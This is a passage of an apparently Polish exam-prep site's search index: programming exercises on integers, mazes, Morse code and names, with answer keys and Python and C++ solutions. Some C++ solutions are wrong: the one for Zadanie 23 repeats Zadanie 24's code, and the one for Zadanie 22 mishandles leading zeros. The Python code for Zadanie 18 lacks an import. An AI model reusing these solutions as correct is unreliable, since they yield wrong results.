0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-18","title":"Zadanie 18","text":"PythonC++ <pre><code>with open(file_name) as file:\n    numbers = list(map(int, file.read().split()))\n\nfor num in numbers:\n    sq = int(math.sqrt(num))\n    if sq**2 == num:\n        print(num)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n#include &lt;cmath&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"file_name\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    for (int num : numbers) {\n        int sq = static_cast&lt;int&gt;(sqrt(num));\n        if (sq * sq == num) {\n            cout &lt;&lt; num &lt;&lt; endl;\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-19","title":"Zadanie 19","text":"PythonC++ <pre><code>with open(file_name) as file:\n    numbers = list(map(int, file.read().split()))\n\ncounter = 0\n\nfor i in range(len(numbers)):\n    for j in range(i + 1, len(numbers)):\n        for k in range(j + 1, len(numbers)):\n            a, b, c = numbers[i], numbers[j], numbers[k]\n            if a + b + c - max(a, b, c) &gt; max(a, b, c):\n                counter += 1\n\nprint(counter)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"file_name\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    int counter = 0;\n\n    for (size_t i = 0; i &lt; numbers.size(); ++i) {\n        for (size_t j = i + 1; j &lt; numbers.size(); ++j) {\n            for (size_t k = j + 1; k &lt; numbers.size(); ++k) {\n                int a = numbers[i], b = numbers[j], c = numbers[k];\n                if (a + b + c - max({a, b, c}) &gt; max({a, b, c})) {\n                    counter += 1;\n                }\n            }\n        }\n    }\n\n    cout &lt;&lt; counter &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-20","title":"Zadanie 20","text":"PythonC++ <pre><code>with open(file_name) as file:\n    numbers = list(map(int, file.read().split()))\n\nfor num in numbers:\n    if num % 10 == (num**2) % 10:\n        print(num)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"file_name\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    for (int num : numbers) {\n        if (num % 10 == (num * num) % 10) {\n            cout &lt;&lt; num &lt;&lt; endl;\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-21","title":"Zadanie 21","text":"PythonC++ <pre><code>with open(file_name) as file:\n    numbers = list(map(int, file.read().split()))\n\nfor num in numbers:\n    sq = str(num ** 2)\n    for i in range(1, len(sq)):\n        left = int(sq[:i])\n        right = int(sq[i:])\n        if left + right == num and right != 0:\n            print(num)\n            break\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"file_name\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    for (int num : numbers) {\n        string sq = to_string(num * num);\n        for (size_t i = 1; i &lt; sq.size(); ++i) {\n            int left = stoi(sq.substr(0, i));\n            int right = stoi(sq.substr(i));\n            if (left + right == num &amp;&amp; right != 0) {\n                cout &lt;&lt; num &lt;&lt; endl;\n                break;\n            }\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-22","title":"Zadanie 22","text":"PythonC++ <pre><code>with open(file_name) as file:\n    numbers = list(map(int, file.read().split()))\n\nfor num in numbers:\n    binary = str(bin(num))[2:]\n    if binary.count(\"10\") == 1 and binary.count(\"01\") == 0:\n        print(num, binary)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n#include &lt;bitset&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"file_name\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    for (int num : numbers) {\n        bitset&lt;32&gt; binary(num);\n        string binary_str = binary.to_string();\n        if (binary_str.find(\"10\") != string::npos &amp;&amp; binary_str.find(\"01\") == string::npos) {\n            cout &lt;&lt; num &lt;&lt; \" \" &lt;&lt; binary_str &lt;&lt; endl;\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-23","title":"Zadanie 23","text":"PythonC++ <pre><code>with open(file_name) as file:\n    numbers = list(map(int, file.read().split()))\n\nfor num in numbers:\n    sm = 0\n    for i, digit in enumerate(str(num)):\n        sm += int(digit) ** (i + 1)\n\n    if sm == num:\n        print(num)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n#include &lt;string&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"file_name\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    for (int num : numbers) {\n        string num_str = to_string(num);\n        vector&lt;int&gt; seq;\n        for (char digit : num_str) {\n            seq.push_back(digit - '0');\n        }\n        int n = seq.size();\n        while (seq.back() &lt; num) {\n            int sum = 0;\n            for (int i = seq.size() - n; i &lt; seq.size(); ++i) {\n                sum += seq[i];\n            }\n            seq.push_back(sum);\n        }\n\n        if (seq.back() == num) {\n            cout &lt;&lt; num &lt;&lt; endl;\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-24","title":"Zadanie 24","text":"PythonC++ <pre><code>with open(file_name) as file:\n    numbers = list(map(int, file.read().split()))\n\nfor num in numbers:\n    seq = list(map(int,str(num)))\n    n = len(seq)\n    while seq[-1] &lt; num:\n        seq.append(sum(seq[-n:]))\n\n    if seq[-1] == num:\n        print(num)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n#include &lt;string&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"file_name\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    for (int num : numbers) {\n        string num_str = to_string(num);\n        vector&lt;int&gt; seq;\n        for (char digit : num_str) {\n            seq.push_back(digit - '0');\n        }\n        int n = seq.size();\n        while (seq.back() &lt; num) {\n            int sum = 0;\n            for (int i = seq.size() - n; i &lt; seq.size(); ++i) {\n                sum += seq[i];\n            }\n            seq.push_back(sum);\n        }\n\n        if (seq.back() == num) {\n            cout &lt;&lt; num &lt;&lt; endl;\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/maze/","title":"Labirynt","text":"<p>W pliku maze.txt znajduje si\u0119 opis labiryntu. Pierwsza linia zawiera dwie liczby naturalne oddzielone spacj\u0105, oznaczaj\u0105ce szeroko\u015b\u0107 i wysoko\u015b\u0107 labiryntu. Kolejne linie opisuj\u0105 labirynt o podanych wymiarach. Ka\u017cda cyfra opisuje jedno pole labiryntu. Pole o warto\u015bci zero oznacza \u015bcian\u0119. Pole o warto\u015bci jeden oznacza punkt wej\u015bcia, a pole o warto\u015bci dziewi\u0119\u0107 oznacza punkt wyj\u015bcia. Pozosta\u0142e pola, zawieraj\u0105ce cyfry od 2 do 8, opisuj\u0105 korytarze. Jest tylko jedno pole wej\u015bcia i jedno pole wyj\u015bcia.</p> <p>Labirynt jest zbudowany w taki spos\u00f3b, \u017ce istnieje dok\u0142adnie jedna \u015bcie\u017cka prowadz\u0105ca od wej\u015bcia do wyj\u015bcia (taka, \u017ce ka\u017cde pole odwiedzamy co najwy\u017cej raz).</p> <p> maze.txt</p> <p>W pliku maze_test.txt znajduje si\u0119 opis labiryntu jak podano wy\u017cej.</p> <p> maze_test.txt</p> <p>Napisz program/programy rozwi\u0105zuj\u0105ce poni\u017csze zadania.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/maze/#zadanie-1","title":"Zadanie 1","text":"<p>Po labiryncie mo\u017cemy porusza\u0107 si\u0119 wykonuj\u0105c ruch o jedno pole w lewo, prawo, do g\u00f3ry lub na d\u00f3\u0142. Podaj ile minimalnie ruch\u00f3w trzeba wykona\u0107, aby przemie\u015bci\u0107 si\u0119 z wej\u015bcia do wyj\u015bcia pod warunkiem, \u017ce nie mo\u017cemy stawa\u0107 na polach reprezentuj\u0105cych \u015bciany. Dla danych z pliku maze_test.txt wynik to \\(16\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/maze/#zadanie-2","title":"Zadanie 2","text":"<p>Po labiryncie mo\u017cemy porusza\u0107 si\u0119 wykonuj\u0105c ruch o jedno pole w lewo, prawo, do g\u00f3ry lub na d\u00f3\u0142. Ka\u017cde pole ma okre\u015blony koszt oznaczony liczb\u0105 reprezentuj\u0105c\u0105 to pole. Podaj jaki b\u0119dzie minimalny sumaryczny koszt przemieszczenia si\u0119 z pola wej\u015bciowego na pole wyj\u015bciowe pod warunkiem, \u017ce nie mo\u017cemy stawa\u0107 na polach reprezentuj\u0105cych \u015bciany. Do kosztu nie wliczamy kosztu pola wej\u015bcia i pola wyj\u015bcia. Dla danych z pliku maze_test.txt wynik to \\(73\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/maze/#zadanie-3","title":"Zadanie 3","text":"<p>Po labiryncie mo\u017cemy porusza\u0107 si\u0119 wykonuj\u0105c ruch o jedno pole w lewo, prawo, do g\u00f3ry lub na d\u00f3\u0142. Ile jest takich p\u00f3l korytarza, kt\u00f3re nie znajd\u0105 si\u0119 na najkr\u00f3tszej \u015bcie\u017cce prowadz\u0105cej z wej\u015bcia do wyj\u015bcia, pod warunkiem, \u017ce nie mo\u017cemy stawa\u0107 na polach reprezentuj\u0105cych \u015bciany? Dla danych z pliku maze_test.txt wynik to \\(32\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/maze/#zadanie-4","title":"Zadanie 4","text":"<p>Po labiryncie mo\u017cemy porusza\u0107 si\u0119 wykonuj\u0105c ruch o jedno pole w lewo, prawo, do g\u00f3ry lub na d\u00f3\u0142. Ka\u017cde pole ma okre\u015blony koszt oznaczony liczb\u0105 reprezentuj\u0105c\u0105 to pole. Podaj jaki b\u0119dzie maksymalny sumaryczny koszt przemieszczenia si\u0119 z pola wej\u015bciowego na pole wyj\u015bciowe pod warunkiem, \u017ce mo\u017cemy stawa\u0107 na polach reprezentuj\u0105cych \u015bciany, a na ka\u017cdym polu mo\u017cemy stan\u0105\u0107 co najwy\u017cej raz. Do kosztu nie wliczamy kosztu pola wej\u015bcia i pola wyj\u015bcia. Dla danych z pliku maze_test.txt wynik to \\(241\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/maze/#zadanie-5","title":"Zadanie 5","text":"<p>Po labiryncie mo\u017cemy porusza\u0107 si\u0119 wykonuj\u0105c ruch o jedno pole w prawo lub w d\u00f3\u0142. Ka\u017cde pole ma okre\u015blony koszt oznaczony liczb\u0105 reprezentuj\u0105c\u0105 to pole. Stosuj\u0105c algorytm zach\u0142anny podaj jaki b\u0119dzie maksymalny (mo\u017cliwy do uzyskania algorytmem zach\u0142annym) sumaryczny koszt przemieszczenia si\u0119 z pola wej\u015bciowego na pole wyj\u015bciowe pod warunkiem, \u017ce mo\u017cemy stawa\u0107 na polach reprezentuj\u0105cych \u015bciany, a na ka\u017cdym polu mo\u017cemy stan\u0105\u0107 co najwy\u017cej raz. Do kosztu nie wliczamy kosztu pola wej\u015bcia i pola wyj\u015bcia. Dla danych z pliku maze_test.txt wynik to \\(27\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/maze/#zadanie-6","title":"Zadanie 6","text":"<p>Po labiryncie mo\u017cemy porusza\u0107 si\u0119 wykonuj\u0105c ruch o jedno pole w prawo lub w d\u00f3\u0142. Ka\u017cde pole ma okre\u015blony koszt oznaczony liczb\u0105 reprezentuj\u0105c\u0105 to pole. Podaj jaki b\u0119dzie maksymalny sumaryczny koszt przemieszczenia si\u0119 z pola wej\u015bciowego na pole wyj\u015bciowe pod warunkiem, \u017ce mo\u017cemy stawa\u0107 na polach reprezentuj\u0105cych \u015bciany, a na ka\u017cdym polu mo\u017cemy stan\u0105\u0107 co najwy\u017cej raz. Do kosztu nie wliczamy kosztu pola wej\u015bcia i pola wyj\u015bcia. Dla danych z pliku maze_test.txt wynik to \\(79\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/maze/answers/","title":"Odpowiedzi","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/maze/answers/#zadanie-1","title":"Zadanie 1","text":"<pre><code>64\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/maze/answers/#zadanie-2","title":"Zadanie 2","text":"<pre><code>332\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/maze/answers/#zadanie-3","title":"Zadanie 3","text":"<pre><code>512\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/maze/answers/#zadanie-4","title":"Zadanie 4","text":"<pre><code>2890\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/maze/answers/#zadanie-5","title":"Zadanie 5","text":"<pre><code>288\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/maze/answers/#zadanie-6","title":"Zadanie 6","text":"<pre><code>341\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/maze/solution-python/","title":"Rozwi\u0105zania - Python","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/maze/solution-python/#zadanie-1","title":"Zadanie 1","text":"<pre><code>from math import inf\n\ndef dfs(x, y, maze, length):\n    if maze[x][y] == 9:\n        return length\n\n    if maze[x][y] == 0:\n        return inf\n\n    maze[x][y] = 0\n\n    return min(\n        dfs(x - 1, y, maze, length + 1),\n        dfs(x + 1, y, maze, length + 1),\n        dfs(x, y - 1, maze, length + 1),\n        dfs(x, y + 1, maze, length + 1),\n    )\n\nwith open(\"maze.txt\") as file:\n    file.readline()\n    maze = [list(map(int, list(line.strip()))) for line in file]\n\nx, y = 1, 1\nprint(dfs(x, y, maze, 0))\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/maze/solution-python/#zadanie-2","title":"Zadanie 2","text":"<pre><code>from math import inf\n\ndef dfs_cost(x, y, maze, cost):\n    if maze[x][y] == 9:\n        return cost - 1\n\n    if maze[x][y] == 0:\n        return inf\n\n    cost += maze[x][y]\n    maze[x][y] = 0\n\n    return min(\n        dfs_cost(x - 1, y, maze, cost),\n        dfs_cost(x + 1, y, maze, cost),\n        dfs_cost(x, y - 1, maze, cost),\n        dfs_cost(x, y + 1, maze, cost),\n    )\n\nwith open(\"maze.txt\") as file:\n    file.readline()\n    maze = [list(map(int, list(line.strip()))) for line in file]\n\nx, y = 1, 1\nprint(dfs_cost(x, y, maze, 0))\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/maze/solution-python/#zadanie-3","title":"Zadanie 3","text":"<pre><code>from math import inf\n\ndef dfs(x, y, maze, length):\n    if maze[x][y] == 9:\n        return length\n\n    if maze[x][y] == 0:\n        return inf\n\n    maze[x][y] = 0\n\n    return min(\n        dfs(x - 1, y, maze, length + 1),\n        dfs(x + 1, y, maze, length + 1),\n        dfs(x, y - 1, maze, length + 1),\n        dfs(x, y + 1, maze, length + 1),\n    )\n\nwith open(\"maze.txt\") as file:\n    width, height = map(int, file.readline().split())\n    maze_str = file.read().strip()\n    fields_count = width * height - maze_str.count(\"0\")\n    maze = [list(map(int, list(line.strip()))) for line in maze_str.split(\"\\n\")]\n\nx, y = 1, 1\nprint(fields_count - dfs(x, y, maze, 0) - 1)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/maze/solution-python/#zadanie-4","title":"Zadanie 4","text":"<pre><code>with open(\"maze.txt\") as file:\n    file.readline()\n    maze_sum = sum([sum(map(int, list(line.strip()))) for line in file])\n\nprint(maze_sum - 10)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/maze/solution-python/#zadanie-5","title":"Zadanie 5","text":"<pre><code>with open(\"maze.txt\") as file:\n    width, height = map(int, file.readline().split())\n    maze = [list(map(int, list(line.strip()))) for line in file]\n\nx, y = 1, 1\nresult = 0\nwhile x != width - 1 and y != height - 1:\n    if maze[x + 1][y] &gt; maze[x][y + 1]:\n        x += 1\n    else:\n        y += 1\n\n    result += maze[x][y]\n\nwhile x != width - 1:\n    x += 1\n    result += maze[x][y]\n\nwhile y != height - 1:\n    y += 1\n    result += maze[x][y]\n\nprint(result - 9)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/maze/solution-python/#zadanie-6","title":"Zadanie 6","text":"<pre><code>with open(\"maze.txt\") as file:\n    width, height = map(int, file.readline().split())\n    maze = [list(map(int, list(line.strip()))) for line in file]\n\nfor x in range(height - 2, 0, -1):\n    for y in range(width - 2, 0, -1):\n        maze[x][y] += max(maze[x + 1][y], maze[x][y + 1])\n\nprint(maze[1][1] - 10)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/morse-code/","title":"Kod Morse'a","text":"<p>W pliku morse_alphabet.txt znajduje si\u0119 alfabet kodu Morse'a: 36 linii, ka\u017cda zawieraj\u0105ca znak (wielk\u0105 liter\u0119 alfabetu angielskiego lub cyfr\u0119) oraz, po spacji, jego kodowanie w alfabecie kodu Morse'a, tzn. ci\u0105g my\u015blnik\u00f3w i/lub kropek.</p> <p> morse_alphabet.txt</p> <p>W pliku morse.txt znajduje si\u0119 100 linii, ka\u017cda zawieraj\u0105ca jeden wyraz zakodowany w alfabecie kodu Morse'a. Wiadomo\u015b\u0107 mo\u017ce sk\u0142ada\u0107 si\u0119 z wielu znak\u00f3w, a ka\u017cdy kolejny kod znaku jest oddzielony znakiem spacji.</p> <p> morse.txt</p> <p>W pliku morse_test.txt znajduje si\u0119 10 linii jak opisano powy\u017cej.</p> <p> morse_test.txt</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/morse-code/#zadanie-1","title":"Zadanie 1","text":"<p>Odkoduj wiadomo\u015bci z pliku morse.txt i zapisz je do pliku morse_decoded.txt w postaci tekstu.</p> <p>Odpowied\u017a dla pliku morse_test.txt:</p> <pre><code>DRAW\nINSIDE\nFORCE\nPARTNER\nCAMERA\nADD\nMOM\nLEVEL\nMMO\nOCCUR\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/morse-code/#zadanie-2","title":"Zadanie 2","text":"<p>Palindrom to wyraz, kt\u00f3ry jest taki sam czytany od lewej do prawej i od prawej do lewej. Policz, ile palindrom\u00f3w jest zakodowanych w pliku morse.txt.</p> <p>Odpowied\u017a dla pliku morse_test.txt: 2.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/morse-code/#zadanie-3","title":"Zadanie 3","text":"<p>Podaj d\u0142ugo\u015b\u0107 najd\u0142u\u017cszego i d\u0142ugo\u015b\u0107 najkr\u00f3tszego wyrazu z pliku morse.txt.</p> <p>Odpowied\u017a dla pliku morse_test.txt:</p> <ul> <li>najd\u0142u\u017cszy: 7</li> <li>najkr\u00f3tszy: 3</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/programming/morse-code/#zadanie-4","title":"Zadanie 4","text":"<p>Anagramy to wyrazy, kt\u00f3re sk\u0142adaj\u0105 si\u0119 z dok\u0142adnie tych samych znak\u00f3w, ale niekoniecznie w tej samej kolejno\u015bci. Policz, ile jest par anagram\u00f3w w pliku morse.txt.</p> <p>Odpowied\u017a dla pliku morse_test.txt: 1.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/morse-code/answers/","title":"Odpowiedzi","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/morse-code/answers/#zadanie-1","title":"Zadanie 1","text":"<p> morse_decoded.txt</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/morse-code/answers/#zadanie-2","title":"Zadanie 2","text":"<p>10</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/morse-code/answers/#zadanie-3","title":"Zadanie 3","text":"<p>Najd\u0142u\u017cszy: 11 Najkr\u00f3tszy: 2</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/morse-code/answers/#zadanie-4","title":"Zadanie 4","text":"<p>5</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/","title":"Imiona","text":"<p>W pliku names.txt znajduje si\u0119 \\(100\\) imion z\u0142o\u017conych wy\u0142\u0105cznie z liter alfabetu angielskiego, ka\u017cde zapisane w osobnym wierszu. Imiona mog\u0105 si\u0119 powtarza\u0107.</p> <p> names.txt</p> <p>W pliku names_test.txt znajduje si\u0119 \\(10\\) wierszy, jak opisano powy\u017cej.</p> <p> names_test.txt</p> <p>Napisz program/programy rozwi\u0105zuj\u0105ce poni\u017csze zadania.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/#zadanie-1","title":"Zadanie 1","text":"<p>Podaj, ile imion z pliku names.txt zaczyna si\u0119 na liter\u0119 B. Dla danych z pliku names_test.txt wynik to \\(1\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/#zadanie-2","title":"Zadanie 2","text":"<p>Podaj, ile imion w pliku names.txt ko\u0144czy si\u0119 na liter\u0119 a. Dla danych z pliku names_test.txt wynik to \\(3\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/#zadanie-3","title":"Zadanie 3","text":"<p>Podaj, ile imion w pliku names.txt zaczyna si\u0119 samog\u0142osk\u0105. Dla danych z pliku names_test.txt wynik to \\(1\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/#zadanie-4","title":"Zadanie 4","text":"<p>Podaj, ile imion w pliku names.txt zaczyna si\u0119 sp\u00f3\u0142g\u0142osk\u0105 i jednocze\u015bnie ko\u0144czy si\u0119 samog\u0142osk\u0105. Dla danych z pliku names_test.txt wynik to \\(4\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/#zadanie-5","title":"Zadanie 5","text":"<p>Podaj, ile imion w pliku names.txt zawiera w \u015brodku (pomijamy pierwsz\u0105 i ostatni\u0105 liter\u0119) liter\u0119 e. Dla danych z pliku names_test.txt wynik to \\(3\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/#zadanie-6","title":"Zadanie 6","text":"<p>Podaj wszystkie imiona z pliku names.txt, kt\u00f3re zawieraj\u0105 wi\u0119cej ni\u017c jedn\u0105 liter\u0119 a lub A. Dla danych z pliku names_test.txt wynik to:</p> <pre><code>Laura\nAnna\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/#zadanie-7","title":"Zadanie 7","text":"<p>Podaj wszystkie imiona z pliku names.txt, kt\u00f3re nie zawieraj\u0105 liter a, A. Dla danych z pliku names_test.txt wynik to:</p> <pre><code>Bob\nJeffrey\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/#zadanie-8","title":"Zadanie 8","text":"<p>Podaj wszystkie imiona z pliku names.txt, kt\u00f3re zawieraj\u0105 dwie identyczne (tak\u017ce ze wzgl\u0119du na wielko\u015b\u0107) litery wyst\u0119puj\u0105ce obok siebie. Dla danych z pliku names_test.txt wynik to:</p> <pre><code>Jessica\nJeffrey\nAnna\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/#zadanie-9","title":"Zadanie 9","text":"<p>Wypisz wszystkie imiona z pliku names.txt, kt\u00f3re zawieraj\u0105 najwi\u0119cej samog\u0142osek. Wynik podaj w kolejno\u015bci alfabetycznej. Dla danych z pliku names_test.txt wynik to:</p> <pre><code>Jeffrey\nJessica\nLaura\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/#zadanie-10","title":"Zadanie 10","text":"<p>Podaj d\u0142ugo\u015b\u0107 najkr\u00f3tszego i najd\u0142u\u017cszego imienia w pliku names.txt. Podaj wszystkie imiona o tych d\u0142ugo\u015bciach. Dla danych z pliku names_test.txt wynik to:</p> <pre><code>Najkr\u00f3tsze imiona\nD\u0142ugo\u015b\u0107: 3\nImiona: Bob\n\nNajd\u0142u\u017csze imiona\nD\u0142ugo\u015b\u0107: 7\nImiona: Crystal, Jessica, Jeffrey\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/#zadanie-11","title":"Zadanie 11","text":"<p>Podaj liczb\u0119 imion z pliku names.txt po usuni\u0119ciu duplikat\u00f3w. Dla danych z pliku names_test.txt wynik to \\(9\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/#zadanie-12","title":"Zadanie 12","text":"<p>Podaj wszystkie imiona z pliku names.txt, kt\u00f3re wyst\u0119puj\u0105 w pliku dok\u0142adnie raz. Wynik uporz\u0105dkuj alfabetycznie. Dla danych z pliku names_test.txt wynik to:</p> <pre><code>Anna\nBob\nCrystal\nDave\nJeffrey\nJessica\nLaura\nMegan\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/#zadanie-13","title":"Zadanie 13","text":"<p>Podaj imi\u0119/imiona z pliku names.txt, kt\u00f3re wyst\u0119puje/\u0105 najcz\u0119\u015bciej. Dla danych z pliku names_test.txt wynik to:</p> <pre><code>Marvin\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/#zadanie-14","title":"Zadanie 14","text":"<p>Podaj wszystkie imiona z pliku names.txt, w kt\u00f3rych zapisie litery si\u0119 nie powtarzaj\u0105, ignoruj\u0105c przy tym wielko\u015b\u0107 liter. Wynik uporz\u0105dkuj alfabetycznie. Dla danych z pliku names_test.txt wynik to:</p> <pre><code>Crystal\nDave\nMarvin\nMarvin\nMegan\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/#zadanie-15","title":"Zadanie 15","text":"<p>Dla ka\u017cdego imienia z pliku names.txt policz sum\u0119 kod\u00f3w ASCII jego liter. Podaj najmniejsz\u0105 i najwi\u0119ksz\u0105 sum\u0119, a tak\u017ce wszystkie imiona z pliku, kt\u00f3re maj\u0105 tak\u0105 sum\u0119. Dla danych z pliku names_test.txt wynik to:</p> <pre><code>Najmniejsza suma ascii: 275\nImiona: Bob\n\nNajwi\u0119ksza suma ascii: 738\nImiona: Crystal\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/#zadanie-16","title":"Zadanie 16","text":"<p>Podaj najd\u0142u\u017cszy wsp\u00f3lny podci\u0105g rosn\u0105cy z pliku names.txt, sk\u0142adaj\u0105cy si\u0119 z s\u0105siednich imion, kt\u00f3re s\u0105 uporz\u0105dkowane alfabetycznie \u015bci\u015ble rosn\u0105co. Podaj tak\u017ce d\u0142ugo\u015b\u0107 tego podci\u0105gu, a tak\u017ce numery imion, na kt\u00f3rych si\u0119 ten podci\u0105g zaczyna i ko\u0144czy. Je\u017celi jest kilka takich podci\u0105g\u00f3w, podaj pierwszy z nich. Dla danych z pliku names_test.txt wynik to:</p> <pre><code>Liczba imion: 4\nPocz\u0105tek sekwencji: 5\nKoniec sekwencji: 8\nNajd\u0142u\u017csza sekwencja rosn\u0105cych imion:\nDave\nJeffrey\nLaura\nMarvin\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/answers/","title":"Odpowiedzi","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/names/answers/#zadanie-1","title":"Zadanie 1","text":"<pre><code>5\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/answers/#zadanie-2","title":"Zadanie 2","text":"<pre><code>23\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/answers/#zadanie-3","title":"Zadanie 3","text":"<pre><code>9\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/answers/#zadanie-4","title":"Zadanie 4","text":"<pre><code>46\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/answers/#zadanie-5","title":"Zadanie 5","text":"<pre><code>38\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/answers/#zadanie-6","title":"Zadanie 6","text":"<pre><code>Jonathan\nGabriella\nAna\nAaron\nMikayla\nSarah\nAndrea\nTamara\nBriana\nBarbara\nSandra\nRachael\nSandra\nSabrina\nLaura\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/answers/#zadanie-7","title":"Zadanie 7","text":"<pre><code>Robert\nKristen\nKevin\nChristine\nJohn\nRenee\nKyle\nCheryl\nRobin\nMichelle\nJorge\nJennifer\nJohn\nJohn\nSeth\nChristopher\nLuke\nKelly\nChloe\nChristopher\nPeter\nWendy\nChristopher\nChloe\nTom\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/answers/#zadanie-8","title":"Zadanie 8","text":"<pre><code>William\nRebecca\nWilliam\nRenee\nJessica\nGabriella\nTammy\nMichelle\nJennifer\nMallory\nTammy\nWilliam\nCarrie\nKelly\nMelissa\nPatty\nBrittany\nShannon\nDonna\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/answers/#zadanie-9","title":"Zadanie 